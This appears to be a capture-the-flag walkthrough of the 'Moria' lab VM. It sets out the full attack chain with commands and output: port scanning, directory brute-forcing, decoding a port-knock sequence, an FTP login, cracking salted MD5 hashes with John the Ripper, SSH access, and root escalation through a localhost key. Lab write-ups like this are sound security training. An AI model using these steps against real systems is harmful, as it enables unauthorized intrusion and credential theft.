@@ -1,0 +1,150 @@
+Recon Phase:
+
+$ nmap -p 1-65535 -T4 -A -v 172.16.34.161
+
+    PORT   STATE SERVICE VERSION
+    21/tcp open  ftp     vsftpd 2.0.8 or later
+    22/tcp open  ssh     OpenSSH 6.6.1 (protocol 2.0)
+    | ssh-hostkey:
+    |   2048 47:b5:ed:e3:f9:ad:96:88:c0:f2:83:23:7f:a3:d3:4f (RSA)
+    |_  256 85:cd:a2:d8:bb:85:f6:0f:4e:ae:8c:aa:73:52:ec:63 (ECDSA)
+    80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
+    | http-methods:
+    |_  Supported Methods: GET HEAD POST OPTIONS
+    |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
+    |_http-title: Gates of Moria
+
+$ dirb http://172.16.34.161
+
+    + http://172.16.34.161/cgi-bin/
+    + http://172.16.34.161/index.php
+    ==> DIRECTORY: http://172.16.34.161/w/
+    DOWNLOADED: 4612 - FOUND: 2
+
+Then i followed /w directory to http://172.16.34.161/w/h/i/s/p/e/r/the_abyss/
+    Balin: "Be quiet, the Balrog will hear you!"
+$ dirb http://172.16.34.161/w/h/i/s/p/e/r/the_abyss -w -X .txt,.html,.php
+    + http://172.16.34.161/w/h/i/s/p/e/r/the_abyss/index.php
+    + http://172.16.34.161/w/h/i/s/p/e/r/the_abyss/random.txt
+
+random.txt
+    Balin: "Be quiet, the Balrog will hear you!"
+    Oin:"Stop knocking!"
+    Ori:"Will anyone hear us?"
+    Fundin:"That human will never save us!"
+    Nain:"Will the human get the message?"
+    "Eru! Save us!"
+    "We will die here.."
+    "Is this the end?"
+    "Knock knock"
+    "Too loud!"
+    Maeglin:"The Balrog is not around, hurry!"
+    Telchar to Thrain:"That human is slow, don't give up yet"
+    Dain:"Is that human deaf? Why is it not listening?"
+
+Then i tried to brute force port knocking using nmap and wireshark and i noticed something in wireshark
+
+    172.16.34.161	172.16.34.1	TCP	60	2158 → 77 [SYN] Seq=0 Win=512 Len=0
+    172.16.34.1	172.16.34.161	TCP	54	77 → 2158 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0
+    172.16.34.161	172.16.34.1	TCP	60	2158 → 101 [SYN] Seq=0 Win=512 Len=0
+    172.16.34.1	172.16.34.161	TCP	54	101 → 2158 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0
+    172.16.34.161	172.16.34.1	TCP	60	2158 → 108 [SYN] Seq=0 Win=512 Len=0
+    172.16.34.1	172.16.34.161	TCP	54	108 → 2158 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0
+    172.16.34.161	172.16.34.1	TCP	60	1257 → 108 [SYN] Seq=0 Win=512 Len=0
+    172.16.34.1	172.16.34.161	TCP	54	108 → 1257 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0
+    172.16.34.161	172.16.34.1	TCP	60	1257 → 111 [SYN] Seq=0 Win=512 Len=0
+    172.16.34.1	172.16.34.161	TCP	58	111 → 1257 [SYN, ACK] Seq=0 Ack=1 Win=29200 Len=0 MSS=1460
+    172.16.34.161	172.16.34.1	TCP	60	1257 → 110 [SYN] Seq=0 Win=512 Len=0
+    172.16.34.1	172.16.34.161	TCP	54	110 → 1257 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0
+There is a port sequence {77,101,108,111,110}
+I tried port knocking but no luck then i converted {77,101,108,108,111,110} to ascii = Mellon
+================================================================================
+Attacking Phase:
+Then i tried with FTP
+$ ftp 172.16.34.161
+    Connected to 172.16.34.161.
+    220 Welcome Balrog!
+    Name (172.16.34.161:root):
+I used username:Balrog and password:Mellon
+I navigated to /var/www/html there is a directory "QlVraKW4fbIkXau9zkAPNGzviT3UKntl"
+I accessed this directory via browser it gave me
+
+    Prisoner's name   Passkey
+    Balin             c2d8960157fc8540f6d5d66594e165e0
+    Oin 	            727a279d913fba677c490102b135e51e
+    Ori 	            8c3c3152a5c64ffb683d78efc3520114
+    Maeglin 	        6ba94d6322f53f30aca4f34960203703
+    Fundin 	          c789ec9fae1cd07adfc02930a39486a1
+    Nain 	            fec21f5c7dcf8e5e54537cfda92df5fe
+    Dain 	            6a113db1fd25c5501ec3a5936d817c29
+    Thrain 	          7db5040c351237e8332bfbba757a1019
+    Telchar 	        dd272382909a4f51163c77da6356cc6f
+
+and page source gave me
+    <!--
+    6MAp84
+    bQkChe
+    HnqeN4
+    e5ad5s
+    g9Wxv7
+    HCCsxP
+    cC5nTr
+    h8spZR
+    tb9AWe
+    MD5(MD5(Password).Salt)
+    -->
+
+I created hash file to crack all passwords using john the ripper
+
+    Balin:c2d8960157fc8540f6d5d66594e165e0$6MAp84
+    Oin:727a279d913fba677c490102b135e51e$bQkChe
+    Ori:8c3c3152a5c64ffb683d78efc3520114$HnqeN4
+    Maeglin:6ba94d6322f53f30aca4f34960203703$e5ad5s
+    Fundin:c789ec9fae1cd07adfc02930a39486a1$g9Wxv7
+    Nain:fec21f5c7dcf8e5e54537cfda92df5fe$HCCsxP
+    Dain:6a113db1fd25c5501ec3a5936d817c29$cC5nTr
+    Thrain:7db5040c351237e8332bfbba757a1019$h8spZR
+    Telchar:dd272382909a4f51163c77da6356cc6f$tb9AWe
+
+our format is MD5(MD5(Password).Salt) which is dynamic_2006 [md5(md5($p).$s)
+
+$ john -form=dynamic_2006 hash.txt
+
+    rainbow          (Oin)
+    flower           (Balin)
+    fuckoff          (Maeglin)
+    spanky           (Ori)
+    abcdef           (Dain)
+    warrior          (Nain)
+    magic            (Telchar)
+    darkness         (Thrain)
+    hunter2          (Fundin)
+$ ssh Ori@172.16.34.161
+  password: spanky
+================================================================================
+Privilege Escalation:
+
+$ cat .ssh/known_hosts
+    127.0.0.1 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCuLX/
+    CWxsOhekXJRxQqQH/Yx0SD+XgUpmlmWN1Y8cvmCYJslOh4vE+I6fmMwCdBfi4W061RmFc+vMALlQUYNz0=
+
+it's a localhost
+$ ssh -i id_rsa root@127.0.0.1
+$ id
+    uid=0(root) gid=0(root) groups=0(root)
+
+$ cat flag.txt
+    “All that is gold does not glitter,
+    Not all those who wander are lost;
+    The old that is strong does not wither,
+    Deep roots are not reached by the frost.
+
+    From the ashes a fire shall be woken,
+    A light from the shadows shall spring;
+    Renewed shall be blade that was broken,
+    The crownless again shall be king.”
+
+    All That is Gold Does Not Glitter by J. R. R. Tolkien
+
+    I hope you suff.. enjoyed this VM. It wasn't so hard, was it?
+    -Abatchy
